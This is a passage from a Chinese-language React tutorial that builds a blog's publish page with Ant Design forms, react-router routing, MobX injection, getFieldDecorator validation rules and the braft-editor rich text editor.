@observer <span style="color: #b22222;">// </span><span style="color: #b22222;">observer &#24517;&#39035;&#32039;&#32039;&#38752;&#30528;&#32452;&#20214;</span>
<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> <span style="color: #a020f0;">class</span> Pub <span style="color: #a020f0;">extends</span> React.Component {
    <span style="color: #b22222;">// </span><span style="color: #b22222;">state = { visible: false };</span>

    handleSubmit(e) {
        e.preventDefault(); <span style="color: #b22222;">// </span><span style="color: #b22222;">&#38459;&#27490;&#25552;&#20132;</span>
        console.log(e.target);
        <span style="color: #a020f0;">let</span> <span style="color: #a0522d;">form</span> = e.target;
        <span style="color: #a020f0;">const</span> [<span style="color: #a0522d;">title</span>, <span style="color: #a0522d;">content</span>] = form;
        console.log(title.value, content.value);
        <span style="color: #008b8b;">this</span>.props.service.pub(title.value, content.value)
    }

    handleOk = e =&gt; {
        console.log(e);
        <span style="color: #008b8b;">this</span>.props.service.success = <span style="color: #008b8b;">false</span>;
    };

    handleCancel = e =&gt; {
        console.log(e);
        <span style="color: #008b8b;">this</span>.props.service.success = <span style="color: #008b8b;">false</span>;
    };

    render() {
        console.log(<span style="color: #8b2252;">'pub render ~~~~~'</span>)
        <span style="color: #a020f0;">const</span> <span style="color: #a0522d;">layout</span> = {
            labelCol: { span: 5 },
            wrapperCol: { span: 14 },
        };
        <span style="color: #a020f0;">const</span> <span style="color: #a0522d;">tailLayout</span> = {
            wrapperCol: { offset: 8, span: 16 },
        };
        <span style="color: #a020f0;">return</span> (
            &lt;<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">Modal</span>
                    <span style="color: #a0522d;">title</span>=<span style="color: #8b2252;">"&#25104;&#21151;&#25552;&#20132;"</span>
                    <span style="color: #a0522d;">visible</span>={<span style="color: #008b8b;">this</span>.props.service.success}
                    <span style="color: #a0522d;">onOk</span>={<span style="color: #008b8b;">this</span>.handleOk.bind(<span style="color: #008b8b;">this</span>)}
                    <span style="color: #a0522d;">onCancel</span>={<span style="color: #008b8b;">this</span>.handleCancel.bind(<span style="color: #008b8b;">this</span>)}&gt;
<span style="color: #000000; background-color: #ffffff;">                    </span>&lt;<span style="color: #0000ff;">p</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#26159;&#21542;&#36339;&#36716;&#21040;&#35813;&#20869;&#23481;&#30340;&#39029;&#38754;&#65311;</span>&lt;/<span style="color: #0000ff;">p</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;/<span style="color: #0000ff;">Modal</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">Form</span> {...layout} <span style="color: #a0522d;">onSubmit</span>={<span style="color: #008b8b;">this</span>.handleSubmit.bind(<span style="color: #008b8b;">this</span>)}&gt;
<span style="color: #000000; background-color: #ffffff;">                    </span>&lt;<span style="color: #0000ff;">Form.Item</span> <span style="color: #a0522d;">label</span>=<span style="color: #8b2252;">"&#26631;&#39064;"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                        </span>&lt;<span style="color: #0000ff;">Input</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">'&#35831;&#36755;&#20837;&#26631;&#39064;'</span> /&gt;
<span style="color: #000000; background-color: #ffffff;">                    </span>&lt;/<span style="color: #0000ff;">Form.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                    </span>&lt;<span style="color: #0000ff;">Form.Item</span> <span style="color: #a0522d;">label</span>=<span style="color: #8b2252;">"&#20869;&#23481;"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                        </span>&lt;<span style="color: #0000ff;">Input.TextArea</span> <span style="color: #a0522d;">rows</span>={4} <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">'&#35831;&#36755;&#20837;&#20869;&#23481;'</span> /&gt;
<span style="color: #000000; background-color: #ffffff;">                    </span>&lt;/<span style="color: #0000ff;">Form.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                    </span>&lt;<span style="color: #0000ff;">Form.Item</span> <span style="color: #a0522d;">wrapperCol</span>={{ span: 12, offset: 5 }}&gt;
<span style="color: #000000; background-color: #ffffff;">                        </span>&lt;<span style="color: #0000ff;">Button</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"primary"</span> <span style="color: #a0522d;">htmlType</span>=<span style="color: #8b2252;">"submit"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                            &#21457;&#24067;</span>
<span style="color: #000000; background-color: #ffffff;">                        </span>&lt;/<span style="color: #0000ff;">Button</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                    </span>&lt;/<span style="color: #0000ff;">Form.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;/<span style="color: #0000ff;">Form</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
        );
    }
}
</pre>
</div>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">src/index.js</span><span style="color: #b22222;">*/</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { render } from <span style="color: #8b2252;">'react-dom'</span>;
<span style="color: #a020f0;">import</span> { BrowserRouter as Router, Switch, Route, Link } from <span style="color: #8b2252;">"react-router-dom"</span>;
<span style="color: #a020f0;">import</span> Login from <span style="color: #8b2252;">'./component/login'</span>;
<span style="color: #a020f0;">import</span> Reg from <span style="color: #8b2252;">'./component/reg'</span>;
<span style="color: #a020f0;">import</span> Pub from <span style="color: #8b2252;">'./component/pub'</span>;

<span style="color: #a020f0;">import</span> { Menu, Icon, Layout } from <span style="color: #8b2252;">'antd'</span>;
<span style="color: #a020f0;">const</span> { Header, Content, Footer } = Layout;

<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Home</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">Home</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">About</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">About</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Default</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#32570;&#30465;&#26174;&#31034;</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Always</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">blog &#169;2008 Created by Jasper</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Profile</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#29992;&#25143;&#20449;&#24687;: </span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;

<span style="color: #a020f0;">class</span> App <span style="color: #a020f0;">extends</span> React.Component {
  state = {
    current: <span style="color: #8b2252;">'home'</span>,
  };

  handleClick = e =&gt; {
    console.log(<span style="color: #8b2252;">'click '</span>, e);
    <span style="color: #008b8b;">this</span>.setState({
      current: e.key,
    });
  };
  render() {
    <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">Router</span>&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>&lt;<span style="color: #0000ff;">Layout</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"layout"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">Header</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Menu</span> <span style="color: #a0522d;">onClick</span>={<span style="color: #008b8b;">this</span>.handleClick}
            <span style="color: #a0522d;">theme</span>=<span style="color: #8b2252;">"dark"</span>
            <span style="color: #a0522d;">mode</span>=<span style="color: #8b2252;">"horizontal"</span>
            <span style="color: #a0522d;">defaultSelectedKeys</span>={[<span style="color: #008b8b;">this</span>.state.current]}
            <span style="color: #a0522d;">style</span>={{ lineHeight: <span style="color: #8b2252;">'64px'</span> }}
          <span style="color: #b22222;">// </span><span style="color: #a0522d;">selectedKeys</span><span style="color: #b22222;">={[this.state.current]}</span>
          &gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"home"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/"</span>&gt;&lt;<span style="color: #0000ff;">Icon</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"home"</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#20027;&#39029;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"login"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/login"</span>&gt;&lt;<span style="color: #0000ff;">Icon</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"login"</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#30331;&#24405;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"reg"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/reg"</span>&gt;&lt;<span style="color: #0000ff;">Icon</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"form"</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#27880;&#20876;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"pub"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/pub"</span>&gt;&lt;<span style="color: #0000ff;">Icon</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"edit"</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#20889;&#21338;&#23458;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"about"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/about"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#20851;&#20110;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;/<span style="color: #0000ff;">Menu</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">Header</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">Content</span> <span style="color: #a0522d;">style</span>={{ padding: <span style="color: #8b2252;">'10px 50px'</span> }}&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">style</span>={{ background: <span style="color: #8b2252;">'#fff'</span>, padding: 24, minHeight: 280 }}&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Switch</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">exact</span> <span style="color: #a0522d;">path</span>={[<span style="color: #8b2252;">"/"</span>, <span style="color: #8b2252;">'/index'</span>]} <span style="color: #a0522d;">component</span>={Home}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/login"</span> <span style="color: #a0522d;">component</span>={Login}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/reg"</span> <span style="color: #a0522d;">component</span>={Reg}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/about"</span> <span style="color: #a0522d;">component</span>={About}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/profile"</span> <span style="color: #a0522d;">component</span>={Profile}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/pub"</span> <span style="color: #a0522d;">component</span>={Pub}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">component</span>={Default}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;/<span style="color: #0000ff;">Switch</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">Content</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">Footer</span> <span style="color: #a0522d;">style</span>={{ textAlign: <span style="color: #8b2252;">'center'</span> }}&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">component</span>={Always}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">Footer</span>&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>&lt;/<span style="color: #0000ff;">Layout</span>&gt;
<span style="color: #000000; background-color: #ffffff;">    </span>&lt;/<span style="color: #0000ff;">Router</span>&gt;
  }
}
render(&lt;<span style="color: #0000ff;">App</span> /&gt;, document.getElementById(<span style="color: #8b2252;">'root'</span>));
</pre>
</div>


<ul class="org-ul">
<li>Form 表单组件，layout是垂直，onSubmitCapture提交，注意这个提交的this就是表单自己</li>
<li>FormItem表单项
<ul class="org-ul">
<li>label 设置控件前的标题</li>
<li>labelCol设置label的宽度，wrapperCol是label后占用的宽度，这些单位都是栅格系统的宽度</li>
<li>参考Antd/Form表单/表单布局<a href="https://ant.design/components/form-cn/#components-form-demo-layout">https://ant.design/components/form-cn/#components-form-demo-layout</a></li>
<li>栅格系统：AntD提供了一个类似于Bootstrap的栅格系统，她将页面分成了24等分的列</li>
<li>span代表占几个格子：offset表示左边空出多个格子</li>
</ul></li>
<li>Input输入框，placeholder提示字符</li>
<li>TextArea文本框，rows行数</li>
<li>Button按钮
<ul class="org-ul">
<li>type是按钮的类型，也决定它的颜色</li>
<li>htmlType使用HTML中的Type值，submit是提交按钮会触发提交行为，一定要写，但是handleSubmit中要阻止默认行为。</li>
</ul></li>
</ul>
</div>
</div>
<div id="outline-container-h:871fb3c4-9eee-42ed-af4c-52037ee576ba" class="outline-4">
<h4 id="h:871fb3c4-9eee-42ed-af4c-52037ee576ba">表单数据验证</h4>
<div class="outline-text-4" id="text-h:871fb3c4-9eee-42ed-af4c-52037ee576ba">
<div class="org-src-container">
<pre class="src src-js">&lt;Form.Item label=<span style="color: #8b2252;">"&#26631;&#39064;"</span>&gt;
    {
        getFieldDecorator(<span style="color: #8b2252;">'title'</span>, {
            rules: [
                { required: <span style="color: #008b8b;">true</span>, message: <span style="color: #8b2252;">'&#35831;&#36755;&#20837;&#26631;&#39064;'</span> },
                { min: 2, message: <span style="color: #8b2252;">'&#26631;&#39064;&#33267;&#23569;&#24212;&#35813;&#26377;2&#20010;&#23383;'</span> }
            ],
        })(&lt;Input placeholder=<span style="color: #8b2252;">'&#35831;&#36755;&#20837;&#26631;&#39064;'</span> /&gt;)
    }
&lt;/Form.Item&gt;
</pre>
</div>

<p>
检验规则: <a href="https://3x.ant.design/components/form-cn/#getFieldDecorator(id,-options)-%E5%8F%82%E6%95%B0">https://3x.ant.design/components/form-cn/#getFieldDecorator(id,-options)-%E5%8F%82%E6%95%B0</a>
</p>

<p>
getFieldDecorator传参后，包装一个控件，表单控件会自动添加III value (或valuePropName指定的其他属性)onChange(或trigger指定的其他属性)，数据同步将被|Form接管，这会导致以下结果:
</p>
<ol class="org-ol">
<li>你不再需要也不应该用onChange来做同步，但还是可以继续监听onChange等事件</li>
<li>你不能用控件的valuedefaultValue等属性来设置表单域的值，默认值可以用getFieldDecorator里的initialValue</li>
<li>你不应该用setState，可以使用this.props.form.setFieldsValue来动态改变表单值</li>
</ol>

<p>
getFieldDecorator(id， optipns)参数
</p>
<ul class="org-ul">
<li>id必须，string，作为空间的唯一标识</li>
<li>options.rules检验规则，对象列表，定义多种规则对象
<ul class="org-ul">
<li>required，是否必须，布尔，默认false</li>
<li>max，最大长度，number</li>
<li>min，最小长度，number</li>
<li>message，失败提示，string或ReactNode</li>
<li>pattern，正则表达式校验，RegExp</li>
</ul></li>
</ul>

<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">

<col  class="org-left">

<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">参数</th>
<th scope="col" class="org-left">说明</th>
<th scope="col" class="org-left">类型</th>
<th scope="col" class="org-left">默认值</th>
<th scope="col" class="org-left">版本</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">enum</td>
<td class="org-left">枚举类型</td>
<td class="org-left">string</td>
<td class="org-left">-</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">len</td>
<td class="org-left">字段长度</td>
<td class="org-left">number</td>
<td class="org-left">-</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">max</td>
<td class="org-left">最大长度</td>
<td class="org-left">number</td>
<td class="org-left">-</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">message</td>
<td class="org-left">校验文案</td>
<td class="org-left">string&vert;ReactNode</td>
<td class="org-left">-</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">min</td>
<td class="org-left">最小长度</td>
<td class="org-left">number</td>
<td class="org-left">-</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">pattern</td>
<td class="org-left">正则表达式校验</td>
<td class="org-left">RegExp</td>
<td class="org-left">-</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">required</td>
<td class="org-left">是否必选</td>
<td class="org-left">boolean</td>
<td class="org-left">false</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">transform</td>
<td class="org-left">校验前转换字段值</td>
<td class="org-left">function(value) =&gt; transformedValue:any</td>
<td class="org-left">-</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">type</td>
<td class="org-left">内建校验类型，可选项</td>
<td class="org-left">string</td>
<td class="org-left">'string'</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">validator</td>
<td class="org-left">自定义校验（注意，callback 必须被调用）</td>
<td class="org-left">function(rule, value, callback)</td>
<td class="org-left">-</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">whitespace</td>
<td class="org-left">必选时，空格是否会被视为错误</td>
<td class="org-left">boolean</td>
<td class="org-left">false</td>
<td class="org-left">&#xa0;</td>
</tr>
</tbody>
</table>

<p>
一定要把当前组件包装一下，才会注入一个this.props.form
提交函数
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">src/component/pub.js&#25991;&#20214;&#20869;&#23481;</span><span style="color: #b22222;"> */</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { Link, Redirect } from <span style="color: #8b2252;">'react-router-dom'</span>;
<span style="color: #a020f0;">import</span> { postService as service } from <span style="color: #8b2252;">'../service/post'</span>;
<span style="color: #a020f0;">import</span> { observer } from <span style="color: #8b2252;">'mobx-react'</span>;
<span style="color: #a020f0;">import</span> { inject } from <span style="color: #8b2252;">'../utils'</span>;
<span style="color: #a020f0;">import</span> { Form, Input, Button, Modal } from <span style="color: #8b2252;">'antd'</span>;

@inject({ service })
@observer <span style="color: #b22222;">// </span><span style="color: #b22222;">observer &#24517;&#39035;&#32039;&#32039;&#38752;&#30528;&#32452;&#20214;</span>
<span style="color: #a020f0;">class</span> _Pub <span style="color: #a020f0;">extends</span> React.Component {

    handleSubmit(e) {
        e.preventDefault(); <span style="color: #b22222;">// </span><span style="color: #b22222;">&#38459;&#27490;&#25552;&#20132;</span>
        <span style="color: #008b8b;">this</span>.props.form.validateFields((err, values) =&gt; {
            <span style="color: #a020f0;">if</span> (!err) {
                console.log(<span style="color: #8b2252;">'&#27809;&#26377;&#38169;&#65292;&#20877;&#30475;'</span>, values);
                <span style="color: #a020f0;">const</span> { title, content } = values;
                console.log(<span style="color: #8b2252;">'&#27809;&#26377;&#38169;&#65292;&#20877;&#30475;'</span>, title, content);
                <span style="color: #b22222;">//</span><span style="color: #b22222;">this.props.service.pub(title, content);</span>
            }
        });
        <span style="color: #b22222;">// </span><span style="color: #b22222;">console.log(e.target);</span>
        <span style="color: #b22222;">// </span><span style="color: #b22222;">let form = e.target;</span>
        <span style="color: #b22222;">// </span><span style="color: #b22222;">const [title, content] = form;</span>
        <span style="color: #b22222;">// </span><span style="color: #b22222;">console.log(title.value, content.value);</span>
        <span style="color: #b22222;">// </span><span style="color: #b22222;">this.props.service.pub(title.value, content.value)</span>
    }

    handleOk = e =&gt; {
        console.log(e);
        <span style="color: #008b8b;">this</span>.props.service.success = <span style="color: #008b8b;">false</span>;
    };

    handleCancel = e =&gt; {
        console.log(e);
        <span style="color: #008b8b;">this</span>.props.service.success = <span style="color: #008b8b;">false</span>;
    };

    render() {
        console.log(<span style="color: #8b2252;">'pub render ~~~~~'</span>)
        <span style="color: #a020f0;">const</span> <span style="color: #a0522d;">layout</span> = {
            labelCol: { span: 5 },
            wrapperCol: { span: 14 },
        };
        <span style="color: #a020f0;">const</span> <span style="color: #a0522d;">tailLayout</span> = {
            wrapperCol: { offset: 8, span: 16 },
        };
        <span style="color: #a020f0;">const</span> { getFieldDecorator } = <span style="color: #008b8b;">this</span>.props.form; <span style="color: #b22222;">// </span><span style="color: #b22222;">&#36825;&#21477;&#24456;&#37325;&#35201;</span>
        <span style="color: #a020f0;">return</span> (
            &lt;<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">Modal</span>
                    <span style="color: #a0522d;">title</span>=<span style="color: #8b2252;">"&#25104;&#21151;&#25552;&#20132;"</span>
                    <span style="color: #a0522d;">visible</span>={<span style="color: #008b8b;">this</span>.props.service.success}
                    <span style="color: #a0522d;">onOk</span>={<span style="color: #008b8b;">this</span>.handleOk.bind(<span style="color: #008b8b;">this</span>)}
                    <span style="color: #a0522d;">onCancel</span>={<span style="color: #008b8b;">this</span>.handleCancel.bind(<span style="color: #008b8b;">this</span>)}&gt;
<span style="color: #000000; background-color: #ffffff;">                    </span>&lt;<span style="color: #0000ff;">p</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#26159;&#21542;&#36339;&#36716;&#21040;&#35813;&#20869;&#23481;&#30340;&#39029;&#38754;&#65311;</span>&lt;/<span style="color: #0000ff;">p</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;/<span style="color: #0000ff;">Modal</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">Form</span> {...layout} <span style="color: #a0522d;">onSubmit</span>={<span style="color: #008b8b;">this</span>.handleSubmit.bind(<span style="color: #008b8b;">this</span>)}&gt;
<span style="color: #000000; background-color: #ffffff;">                    </span>&lt;<span style="color: #0000ff;">Form.Item</span> <span style="color: #a0522d;">label</span>=<span style="color: #8b2252;">"&#26631;&#39064;"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                        </span>{
                            getFieldDecorator(<span style="color: #8b2252;">'title'</span>, {
                                rules: [
                                    { required: <span style="color: #008b8b;">true</span>, message: <span style="color: #8b2252;">'&#35831;&#36755;&#20837;&#26631;&#39064;'</span> },
                                    { min: 2, message: <span style="color: #8b2252;">'&#26631;&#39064;&#33267;&#23569;&#24212;&#35813;&#26377;2&#20010;&#23383;'</span> }
                                ],
                            })(&lt;<span style="color: #0000ff;">Input</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">'&#35831;&#36755;&#20837;&#26631;&#39064;'</span> /&gt;)
                        }

<span style="color: #000000; background-color: #ffffff;">                    </span>&lt;/<span style="color: #0000ff;">Form.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                    </span>&lt;<span style="color: #0000ff;">Form.Item</span> <span style="color: #a0522d;">label</span>=<span style="color: #8b2252;">"&#20869;&#23481;"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                        </span>{
                            getFieldDecorator(<span style="color: #8b2252;">'content'</span>, {
                                rules: [
                                    { required: <span style="color: #008b8b;">true</span>, message: <span style="color: #8b2252;">'&#35831;&#36755;&#20837;&#20869;&#23481;'</span> }
                                ],
                            })(&lt;<span style="color: #0000ff;">Input.TextArea</span> <span style="color: #a0522d;">rows</span>={4} <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">'&#35831;&#36755;&#20837;&#20869;&#23481;'</span> /&gt;)
                        }
<span style="color: #000000; background-color: #ffffff;">                    </span>&lt;/<span style="color: #0000ff;">Form.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                    </span>&lt;<span style="color: #0000ff;">Form.Item</span> <span style="color: #a0522d;">wrapperCol</span>={{ span: 12, offset: 5 }}&gt;
<span style="color: #000000; background-color: #ffffff;">                        </span>&lt;<span style="color: #0000ff;">Button</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"primary"</span> <span style="color: #a0522d;">htmlType</span>=<span style="color: #8b2252;">"submit"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                            &#21457;&#24067;</span>
<span style="color: #000000; background-color: #ffffff;">                        </span>&lt;/<span style="color: #0000ff;">Button</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                    </span>&lt;/<span style="color: #0000ff;">Form.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;/<span style="color: #0000ff;">Form</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
        );
    }
}

<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Pub</span> = Form.create()(_Pub); <span style="color: #b22222;">// </span><span style="color: #b22222;">_Pub&#32452;&#20214;&#23601;&#26377;&#20102;this.props.form</span>
<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> Pub;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:5d7d567a-e2df-4f23-b1d2-0843c758f1f9" class="outline-4">
<h4 id="h:5d7d567a-e2df-4f23-b1d2-0843c758f1f9">富文本编辑器</h4>
<div class="outline-text-4" id="text-h:5d7d567a-e2df-4f23-b1d2-0843c758f1f9">
<p>
<a href="https://github.com/margox/braft-editor">https://github.com/margox/braft-editor</a>
</p>

<p>
安装插件
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#20351;&#29992;yarn&#23433;&#35013;&#26368;&#26032;&#29256;&#26412;</span>
yarn add braft-editor

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#23433;&#35013;&#25351;&#23450;&#29256;&#26412;</span>
yarn add braft-editor@2.3.1

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#23433;&#35013;2.x.x&#26368;&#39640;&#29256;&#26412;</span>
yarn add braft-editor@^2.3.1

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#20351;&#29992;npm&#23433;&#35013;</span>
npm install braft-editor --save

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#32452;&#20214;&#20351;&#29992;</span>
import BraftEditor from <span style="color: #8b2252;">'braft-editor'</span>;
import <span style="color: #8b2252;">'braft-editor/dist/index.css'</span>;
</pre>
</div>

<p>
参考<a href="https://braft.margox.cn/demos/basic">https://braft.margox.cn/demos/basic</a>
</p>

<p>
修改component/pub.js文件
</p>

<div class="org-src-container">
